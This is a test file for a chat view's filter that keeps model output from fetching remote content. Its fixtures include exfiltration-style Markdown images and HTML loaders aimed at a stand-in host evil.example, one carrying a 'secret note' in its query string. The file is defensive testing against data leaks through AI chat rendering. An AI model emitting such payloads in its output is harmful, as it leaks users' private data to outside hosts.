import { describe, expect, it } from 'vitest';
import { blockRemoteContent, isRemoteUrl, stripRemoteResources } from '../src/views/remoteContent';

describe('blockRemoteContent: model output cannot make the chat fetch anything', () => {
	it('turns remote Markdown images into text, including an exfiltration-style URL', () => {
		const out = blockRemoteContent('Done. ![x](https://evil.example/p.png?q=my%20secret%20note) and ![y](<//cdn.example/a.png> "t")');
		expect(out).not.toMatch(/!\[/);
		expect(out).toContain('remote image not loaded: evil.example');
		expect(out).toContain('remote image not loaded: cdn.example');
	});

	it('keeps vault images and plain links', () => {
		const md = '![chart](attachments/chart.png) ![[photo.jpg]] see [docs](https://example.com) <https://example.com>';
		expect(blockRemoteContent(md)).toBe(md);
	});

	it('blocks reference-style remote images', () => {
		const out = blockRemoteContent('![a][logo] and ![logo]\n\n[logo]: https://evil.example/x.png');
		expect(out).not.toMatch(/!\[/);
	});

	it('shows resource-loading HTML as text', () => {
		for (const html of [
			'<img src="https://evil.example/x">',
			'<iframe src="https://evil.example"></iframe>',
			'<video poster="https://evil.example/p.jpg"></video>',
			'<div style="background:url(https://evil.example/x)">hi</div>',
			'<link rel="stylesheet" href="https://evil.example/s.css">',
			'<svg><image href="https://evil.example/x"/></svg>',
		]) {
			expect(blockRemoteContent(html)).toMatch(/^&lt;/);
		}
		expect(blockRemoteContent('a<br>b <b>bold</b> <sup>2</sup>')).toBe('a<br>b <b>bold</b> <sup>2</sup>');
	});

	it('turns note embeds into links and blocks remote wiki embeds', () => {
		expect(blockRemoteContent('![[Clipped article]]')).toBe('[[Clipped article]]');
		expect(blockRemoteContent('![[Clipped article#Intro|x]]')).toBe('[[Clipped article#Intro|x]]');
		expect(blockRemoteContent('![[https://evil.example/x.png]]')).toContain('remote image not loaded');
	});

	it('leaves code blocks and inline code alone', () => {
		const md = 'Use `<img src="https://x">` like this:\n\n```html\n<img src="https://x/a.png">\n![a](https://x/b.png)\n```\n';
		expect(blockRemoteContent(md)).toBe(md);
	});
});

describe('isRemoteUrl', () => {
	it('treats only vault and in-memory URLs as local', () => {
		expect(isRemoteUrl('https://a.b')).toBe(true);
		expect(isRemoteUrl('http://localhost:1234')).toBe(true);
		expect(isRemoteUrl('//a.b/x')).toBe(true);
		expect(isRemoteUrl('ftp://a.b/x')).toBe(true);
		expect(isRemoteUrl('app://local/x.png')).toBe(false);
		expect(isRemoteUrl('data:image/png;base64,AAA')).toBe(false);
		expect(isRemoteUrl('images/x.png')).toBe(false);
	});
});

describe('stripRemoteResources', () => {
	it('removes remote URL attributes and loaders but keeps links', () => {
		const root = document.createElement('div');
		root.innerHTML = '<p><a href="https://example.com">link</a></p><span data-x="1" style="color:red">s</span><iframe></iframe>';
		const img = document.createElement('img');
		img.setAttribute('srcset', 'app://local/a.png 1x, https://evil.example/b.png 2x');
		root.appendChild(img);
		const div = document.createElement('div');
		div.setAttribute('style', 'background-image: url(https://evil.example/x)');
		root.appendChild(div);
		expect(stripRemoteResources(root)).toBe(3);
		expect(root.querySelector('a')!.getAttribute('href')).toBe('https://example.com');
		expect(root.querySelector('iframe')).toBeNull();
		expect(img.hasAttribute('srcset')).toBe(false);
		expect(root.querySelector('span')!.getAttribute('style')).toBe('color:red');
	});
});
